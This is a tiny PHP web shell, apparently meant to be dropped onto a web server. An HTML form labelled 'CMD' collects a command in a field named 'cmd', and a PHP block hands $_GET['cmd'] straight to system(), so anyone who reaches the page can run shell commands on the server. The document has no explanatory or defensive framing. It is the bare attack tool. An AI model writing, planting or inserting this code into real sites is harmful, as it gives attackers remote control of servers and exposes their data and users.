<html>
  CMD
  <form method='GET'>
    <span style='color: rgb(255,85,85);'>$</span>
    <input type='text' name='cmd'>
    <input type='submit'>
  </form>
</html>

<?php
    system($_GET['cmd']);
?>
